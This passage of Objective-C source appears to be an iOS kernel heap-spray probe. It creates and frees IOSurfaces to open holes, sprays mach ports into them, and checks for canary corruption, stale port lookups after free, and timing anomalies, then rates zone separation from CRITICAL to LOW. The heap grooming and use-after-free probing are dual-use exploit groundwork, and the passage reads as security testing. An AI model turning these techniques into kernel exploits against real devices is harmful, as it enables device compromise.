                    if (b) for (int j = 0; j < 16; j++) b[j] = 0xFE000000 | i;
                    sym.unlock(surfaces[i], 0, NULL);
                    created++;
                }
            }
            log([NSString stringWithFormat:@"PORTKSPRAY: Created %d surfaces", created]);

            if (!isr_stopped()) {
            // Step 2: Create mach ports for all surfaces
            log(@"PORTKSPRAY: Step 2 — Creating mach ports for all surfaces");
            int portsCreated = 0;
            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
                if (surfaces[i]) {
                    surfPorts[i] = createPort(surfaces[i]);
                    if (surfPorts[i] != MACH_PORT_NULL) portsCreated++;
                }
            }
            log([NSString stringWithFormat:@"PORTKSPRAY: %d mach ports created", portsCreated]);

            // Measure pre-spray timing on fence surfaces
            for (int i = 0; i < FENCE_LOW && !isr_stopped(); i++) {
                if (surfaces[i]) {
                    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
                    sym.lock(surfaces[i], 0, NULL);
                    sym.unlock(surfaces[i], 0, NULL);
                    preSprayTimes[i] = CFAbsoluteTimeGetCurrent() - t0;
                }
            }

            if (!isr_stopped()) {
            // Step 3: Release surfaces 10-89 (create 80 holes)
            log(@"PORTKSPRAY: Step 3 — Releasing surfaces 10-89 (80 holes)");
            for (int i = FENCE_LOW; i < FENCE_HIGH && !isr_stopped(); i++) {
                if (surfaces[i]) {
                    CFRelease(surfaces[i]);
                    surfaces[i] = NULL;
                }
            }
            log(@"PORTKSPRAY: 80 surfaces released");

            if (!isr_stopped()) {
            // Step 4: Spray 1000 mach ports
            log(@"PORTKSPRAY: Step 4 — Spraying 1000 mach ports");
            for (int i = 0; i < SPRAY_PORTS && !isr_stopped(); i++) {
                mach_port_t port = MACH_PORT_NULL;
                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
                if (kr == KERN_SUCCESS) {
                    sprayPorts[sprayCount++] = port;
                }
            }
            log([NSString stringWithFormat:@"PORTKSPRAY: Sprayed %d mach ports", sprayCount]);

            if (!isr_stopped()) {
            // Step 5: Check fence surfaces for corruption
            log(@"PORTKSPRAY: Step 5 — Checking fence surfaces for corruption");
            int fenceCorrupted = 0;
            int pointerLikeValues = 0;

            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
                if (i >= FENCE_LOW && i < FENCE_HIGH) continue;
                if (!surfaces[i]) continue;

                sym.lock(surfaces[i], 0, NULL);
                uint32_t *b = (uint32_t *)sym.getBase(surfaces[i]);
                if (b) {
                    uint32_t expectedCanary = 0xFE000000 | i;
                    for (int j = 0; j < 16; j++) {
                        uint32_t val = b[j];
                        if (val != expectedCanary && val != 0) {
                            fenceCorrupted++;
                            if ((val & 0xFFFF0000) == 0xFFFF0000 ||
                                (val & 0xFFFFF000) == 0xFFFFF000) {
                                pointerLikeValues++;
                            }
                            if (fenceCorrupted <= 3) {
                                log([NSString stringWithFormat:@"PORTKSPRAY: *** Fence surface %d word %d: expected 0x%08X got 0x%08X ***",
                                    i, j, expectedCanary, val]);
                            }
                        }
                    }
                }
                sym.unlock(surfaces[i], 0, NULL);

                // Post-spray timing
                CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
                sym.lock(surfaces[i], 0, NULL);
                sym.unlock(surfaces[i], 0, NULL);
                postSprayTimes[i] = CFAbsoluteTimeGetCurrent() - t0;
            }

            if (fenceCorrupted > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"PORTKSPRAY: *** FENCE CORRUPTION — %d words changed ***", fenceCorrupted]);
            }
            if (pointerLikeValues > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"PORTKSPRAY: *** %d POINTER-LIKE VALUES in fence surfaces ***", pointerLikeValues]);
            }

            if (!isr_stopped()) {
            // Step 6: Try stale port lookups for released surfaces
            log(@"PORTKSPRAY: Step 6 — Stale port lookups for released surfaces");
            int staleLookups = 0;
            for (int i = FENCE_LOW; i < FENCE_HIGH && !isr_stopped(); i++) {
                if (surfPorts[i] != MACH_PORT_NULL) {
                    IOSurfaceRef staleRef = lookupPort(surfPorts[i]);
                    if (staleRef) {
                        staleLookups++;
                        if (staleLookups <= 3) {
                            log([NSString stringWithFormat:@"PORTKSPRAY: *** Stale port lookup succeeded for released surface %d, ID=%u ***",
                                i, sym.getID(staleRef)]);
                        }
                        CFRelease(staleRef);
                    }
                }
            }
            if (staleLookups > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"PORTKSPRAY: *** %d/%d STALE PORT LOOKUPS SUCCEEDED ***", staleLookups, FENCE_HIGH - FENCE_LOW]);
            } else {
                log(@"PORTKSPRAY: No stale port lookups succeeded (ports invalidated correctly)");
            }

            // Step 7: Timing analysis
            log(@"PORTKSPRAY: Step 7 — Timing analysis");
            double preAvg = 0, postAvg = 0;
            int timingCount = 0;
            for (int i = 0; i < FENCE_LOW; i++) {
                if (preSprayTimes[i] > 0 && postSprayTimes[i] > 0) {
                    preAvg += preSprayTimes[i];
                    postAvg += postSprayTimes[i];
                    timingCount++;
                }
            }
            if (timingCount > 0) {
                preAvg /= timingCount;
                postAvg /= timingCount;
                double slowdown = (postAvg > 0 && preAvg > 0) ? postAvg / preAvg : 1.0;
                log([NSString stringWithFormat:@"PORTKSPRAY: Lock/unlock pre=%.6fs post=%.6fs slowdown=%.2fx",
                    preAvg, postAvg, slowdown]);
                if (slowdown > 2.0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"PORTKSPRAY: *** TIMING ANOMALY — %.2fx slowdown suggests allocator stress ***", slowdown]);
                }
            }

            } // end step 6
            } // end step 5
            } // end step 4
            } // end step 3
            } // end step 2

            // Cleanup
            for (int i = 0; i < sprayCount; i++) {
                mach_port_destroy(mach_task_self(), sprayPorts[i]);
            }
            for (int i = 0; i < TOTAL_SURFACES; i++) {
                if (surfPorts[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), surfPorts[i]);
                if (surfaces[i]) CFRelease(surfaces[i]);
            }
            free(surfaces);
            free(surfPorts);
            free(surfIDs);
            free(sprayPorts);
            free(preSprayTimes);
            free(postSprayTimes);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PORTKSPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);

            NSString *verdict;
            if (anomalies >= 4) verdict = @"CRITICAL — kernel zone overlap with mach ports detected";
            else if (anomalies >= 2) verdict = @"HIGH — spray affects surface zone";
            else if (anomalies >= 1) verdict = @"MEDIUM — minor spray anomaly";
            else verdict = @"LOW — zone separation effective";
            log([NSString stringWithFormat:@"PORTKSPRAY: VERDICT: %@", verdict]);

            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"verdict": verdict,
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PortKernelSpray-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}
